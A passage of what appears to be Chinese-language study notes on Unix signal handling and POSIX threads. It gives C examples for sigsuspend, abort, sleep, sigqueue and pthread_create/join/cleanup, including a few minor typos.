class="hljs-string">&quot;signal(SIGUSR1) error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (signal(SIGALRM, sig_alrm) == SIG_ERR)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;signal(SIGALRM) error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;starting main: &quot;</span>);<br><span class="hljs-keyword">if</span> (sigsetjmp(jmpbuf,<span class="hljs-number">1</span>))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ending main: &quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>canjump = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> ( ; ; )<br>pause();<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sig_usr1</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br><span class="hljs-type">time_t</span> starttime;<br><span class="hljs-keyword">if</span> (canjump == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;starting sig_usr1: &quot;</span>);<br>alarm(<span class="hljs-number">3</span>);<br>starttime = time(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">for</span>( ; ; )<br><span class="hljs-keyword">if</span> (time(<span class="hljs-literal">NULL</span>) &gt; starttime + <span class="hljs-number">5</span>)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;finishing sig_ussr1: &quot;</span>);<br>canjump = <span class="hljs-number">0</span>;<br>siglongjmp(jmpbuf, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sig_alrm</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;in sig_alrm: &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sigsuspend"><a href="#sigsuspend" class="headerlink" title="sigsuspend"></a>sigsuspend</h2><p>恢复信号掩码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigsuspend</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *sigmask)</span>;<br>Returns:<span class="hljs-number">-1</span> with errno <span class="hljs-built_in">set</span> to EINTR<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">sig_atomic_t</span> quitflag;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sig_int</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br><span class="hljs-keyword">if</span> (signo == SIGINT)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\ninterrupt\n&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (signo == SIGQUIT)<br>quitflag = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">sigset_t</span> newmask, oldmask, zeromask;<br><span class="hljs-keyword">if</span> (signal(SIGINT, sig_int) == SIG_ERR)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;signal(SIGINT) error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (signal(SIGQUIT, sig_int) == SIG_ERR)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;signal(SIGQUIT) error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>sigemptyset(&amp;zeromask);<br>sigemptyset(&amp;newmask);<br>sigaddset(&amp;newmask, SIGQUIT);<br><span class="hljs-keyword">if</span> (sigprocmask(SIG_BLOCK, &amp;newmask, &amp;oldmask) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//此时阻塞SIGINT信号</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;SIG_BLOCK error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-keyword">while</span> (quitflag == <span class="hljs-number">0</span>)<br>sigsuspend(&amp;zeromask);<span class="hljs-comment">//此时阻塞zeromask里的信号，并挂起进程，等待信号到来唤醒进程</span><br>quitflag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (sigprocmask(SIG_SETMASK, &amp;oldmask, <span class="hljs-literal">NULL</span>))<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;SIG_SETMASK error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="abort"><a href="#abort" class="headerlink" title="abort"></a>abort</h2><p>终止函数会导致程序异常退出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">abort</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">abort</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">sigset_t</span> mask;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>;</span><br>    sigaction(SIGABRT,<span class="hljs-literal">NULL</span>,&amp;action);<br>    <span class="hljs-keyword">if</span>(action.sa_handler == SIG_IGN)&#123;<br>        action.sa_handler = SIG_DFL;<br>        sigaction(SIGABRT,&amp;action,<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (action.sa_handler == SIG_DFL)<br>        fflush(<span class="hljs-literal">NULL</span>);<br>    sigfillset(&amp;mask);<br>    sigdelset(&amp;mask,SIGABRT);<br>    sigprocmask(SIG_SETMASK,&amp;mask,<span class="hljs-literal">NULL</span>);<br>    kill(getpid(),SIGABRT);<br>    <br>    fflush(<span class="hljs-literal">NULL</span>);<br>    action.sa_handler = SIG_DFL;<br>    sigaction(SIGABRT, &amp;action, <span class="hljs-literal">NULL</span>);<br>    sigprocmask(SIG_SETMASK, &amp;mask, <span class="hljs-literal">NULL</span>);<br>    kill(getpid(), SIGABRT);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sleep，nanosleep和clock-nanosleep"><a href="#sleep，nanosleep和clock-nanosleep" class="headerlink" title="sleep，nanosleep和clock_nanosleep"></a>sleep，nanosleep和clock_nanosleep</h2><p>暂停当前进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seconds)</span>;<br>Returns:<span class="hljs-number">0</span> or number of unslept seconds<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sig_alrm</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br><br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">sleep</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seconds)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">newact</span>, <span class="hljs-title">oldact</span>;</span><br><span class="hljs-type">sigset_t</span> newmask, oldmask, suspmask;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> unslept;<br><br>newcat.sa_handler = sig_alrm;<br>sigemptyset(&amp;newact.sa_mask);<br>newact.sa_flags = <span class="hljs-number">0</span>;<br>sigaction(SIGALRM, &amp;newact, &amp;oldact);<br><br>sigemptyset(&amp;newmask);<br>sigaddset(&amp;newmask, SIGALRM);<br>sigprocmask(SIG_BLOCK, &amp;newmask, &amp;oldmask);<br>alarm(seconds);<br>suspmask = oldmask;<br>sigdelset(&amp;suspmask, SIGALRM);<br>sigsuspend(&amp;suspmask);<br>unslept = alarm(<span class="hljs-number">0</span>);<br>sigaction(SIGALRM, &amp;oldact, <span class="hljs-literal">NULL</span>);<br>sigprocmask(SIG_SETMASK, &amp;oldmask, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span>(unslept);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>纳秒级别休眠</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">nanosleep</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *reqtp, <span class="hljs-keyword">struct</span> timespec *remtp)</span>;<br>Returns: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> slept <span class="hljs-keyword">for</span> requested time or <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><ul><li><code>reqtp</code>为休眠时间</li><li><code>remtp</code>为剩余的休眠时间</li></ul><p>指定时间类型的休眠函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">clock_nanosleep</span><span class="hljs-params">(<span class="hljs-type">clockid_t</span> clock_id, <span class="hljs-type">int</span> flags, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *reqtp, <span class="hljs-keyword">struct</span> timespec *remtp)</span>;<br>Returns: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> slept <span class="hljs-keyword">for</span> requeested time or error number on failure<br></code></pre></td></tr></table></figure><ul><li><code>clock_id</code>用于指定计算时间延迟所依据的时钟。</li><li><code>flags</code>用于标记是绝对延迟还是相对延迟<ul><li>相对时间：想要休眠多长时间，0为相对时间</li><li>绝对时间：休眠到哪个时间点</li></ul></li></ul><h2 id="sigqueue"><a href="#sigqueue" class="headerlink" title="sigqueue"></a>sigqueue</h2><p>用于排序的信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigqueue</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid,<span class="hljs-type">int</span> signo, <span class="hljs-type">const</span> <span class="hljs-keyword">union</span> sigval value)</span><br>    Returns: 0 <span class="hljs-keyword">if</span> OK, -1 on error<br></code></pre></td></tr></table></figure><p>使用排队信号的条件</p><ul><li>使用<code>sigaction</code>函数时，需要使用<code>SA_SIGINFO</code>标志</li><li><code>sigaction</code>结构需要使用<code>sa_sigation</code>成员中提供信号处理程序</li><li>使用<code>sigqueue</code>函数发送信号</li></ul><h2 id="psignal和psiginfo"><a href="#psignal和psiginfo" class="headerlink" title="psignal和psiginfo"></a>psignal和psiginfo</h2><p>打印信号对应的字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">psignal</span><span class="hljs-params">(<span class="hljs-type">int</span> signo, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">psiginfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">siginfo_t</span> *info,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br></code></pre></td></tr></table></figure><p>返回信号对应的字符串，不打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">strsignal</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span>;<br></code></pre></td></tr></table></figure><p>将信号与字符串进行映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sig2str</span><span class="hljs-params">(<span class="hljs-type">int</span> signo, <span class="hljs-type">char</span> *str)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">str2sig</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str, <span class="hljs-type">int</span> *signop)</span>;<br></code></pre></td></tr></table></figure><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="pthread-equal"><a href="#pthread-equal" class="headerlink" title="pthread_equal"></a>pthread_equal</h2><p>比较线程<code>id</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_equal</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid1, <span class="hljs-type">pthread_t</span> tid2)</span>;<br><span class="hljs-comment">//返回，0则相等，不为0则不相等</span><br></code></pre></td></tr></table></figure><h2 id="pthread-self"><a href="#pthread-self" class="headerlink" title="pthread_self"></a>pthread_self</h2><p>获取线程<code>id</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> <span class="hljs-title function_">pthread_self</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h2 id="pthread-create"><a href="#pthread-create" class="headerlink" title="pthread_create"></a>pthread_create</h2><p>线程创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_create</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *<span class="hljs-keyword">restrict</span> tidp,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *<span class="hljs-keyword">restrict</span> attr,</span><br><span class="hljs-params">                  <span class="hljs-type">void</span> *(*start_rtn)(<span class="hljs-type">void</span> *),</span><br><span class="hljs-params">                  <span class="hljs-type">void</span> *<span class="hljs-keyword">restrict</span> arg)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>tidp</code>被分配的线程<code>ID</code></li><li><code>attr</code>自定义各种线程属性</li><li><code>start_trn</code>，函数地址</li><li><code>arg</code>运行的参数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> ntid;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">printids</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span><br>&#123;<br><span class="hljs-type">pid_t</span> pid;<br><span class="hljs-type">pthread_t</span> tid;<br>pid = getpid();<br>tid = pthread_self();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s pid %lu tid %lu (0x%lx)\n&quot;</span>,s,(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)pid,(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)tid,(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)tid);<br>&#125;<br><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">thr_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>printids(<span class="hljs-string">&quot;new thread: &quot;</span>);<br><span class="hljs-keyword">return</span> ((<span class="hljs-type">void</span> *)<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br>err = pthread_create(&amp;ntid, <span class="hljs-literal">NULL</span>, thr_fn, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t create thread&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>printids(<span class="hljs-string">&quot;main thread:&quot;</span>);<br>sleep(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="pthread-exit"><a href="#pthread-exit" class="headerlink" title="pthread_exit"></a>pthread_exit</h2><p>线程退出函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pthread_exit</span><span class="hljs-params">(<span class="hljs-type">void</span> *rval_ptr)</span><br></code></pre></td></tr></table></figure><ul><li><code>rval_ptr</code>包含返回代码</li></ul><h2 id="pthread-join"><a href="#pthread-join" class="headerlink" title="pthread_join"></a>pthread_join</h2><p>用于等待线程的结束</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_join</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> thread, <span class="hljs-type">void</span> **rval_ptr)</span><br></code></pre></td></tr></table></figure><ul><li><code>thread</code>等待的线程<code>id</code></li><li><code>rval_ptr</code>用于存储线程的返回值</li></ul><h2 id="pthread-cancel"><a href="#pthread-cancel" class="headerlink" title="pthread_cancel"></a>pthread_cancel</h2><p>取消线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cancel</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid)</span>;<br></code></pre></td></tr></table></figure><h2 id="pthread-cleanup-push和pthread-cleanup-pop"><a href="#pthread-cleanup-push和pthread-cleanup-pop" class="headerlink" title="pthread_cleanup_push和pthread_cleanup_pop"></a>pthread_cleanup_push和pthread_cleanup_pop</h2><p>线程的清理处理函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pthread_cleanup_push</span><span class="hljs-params">(<span class="hljs-type">void</span> (*rtn)(<span class="hljs-type">void</span> *),<span class="hljs-type">void</span> *arg)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">pthread_cleanup_pop</span><span class="hljs-params">(<span class="hljs-type">int</span> execute)</span>;<span class="hljs-comment">//execute = 0则不清理</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cleanup</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cleanup: %s\n&quot;</span>, (<span class="hljs-type">char</span> *)arg);<br>&#125;<br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">thr_fn1</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;thread 1 